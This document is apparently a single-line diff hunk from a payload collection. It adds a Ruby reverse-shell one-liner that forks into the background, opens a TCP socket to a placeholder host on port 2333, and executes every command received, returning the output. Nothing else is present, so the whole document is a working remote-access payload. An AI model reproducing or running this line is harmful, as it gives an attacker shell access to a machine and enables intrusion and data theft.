@@ -1,0 +1,1 @@
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","2333");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
